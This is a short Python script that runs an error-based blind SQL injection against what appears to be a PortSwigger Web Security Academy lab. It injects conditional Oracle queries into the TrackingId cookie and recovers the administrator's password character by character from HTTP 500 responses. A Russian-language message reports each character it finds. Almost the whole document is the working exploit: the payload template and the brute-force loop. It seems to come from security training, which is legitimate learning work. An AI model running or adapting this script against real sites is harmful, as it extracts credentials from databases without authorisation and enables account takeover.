import requests 
import string

url = 'https://0aa6008103f3c76680490889000100fd.web-security-academy.net/'
cookie = {
    "TrackingId": "34Gb1KL8IoMOnJdf",
    "session": "2yEv3OXtAbh1QK3NzTu4cni0I6LqpK3Y"
}

allstring = string.ascii_lowercase + string.digits

track_id = cookie["TrackingId"]

client = requests.Session()
paswrd = ""
response = client.get(url,cookies=cookie, timeout=10)
print(response.status_code)
for num in range(1,21):
    for a in allstring:
       payload= (
            f"{track_id}'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{a}' THEN TO_CHAR(1/0) ELSE'' END FROM users WHERE username='administrator')||'"
       )
       cookie = {
           "TrackingId": payload,
           "session" : "2yEv3OXtAbh1QK3NzTu4cni0I6LqpK3Y" 
       }
       response = client.get(url, cookies=cookie,timeout=10)
       if response.status_code == 500:
           paswrd += a
           print(f'найдет символ: {a}')
           break
print(paswrd)
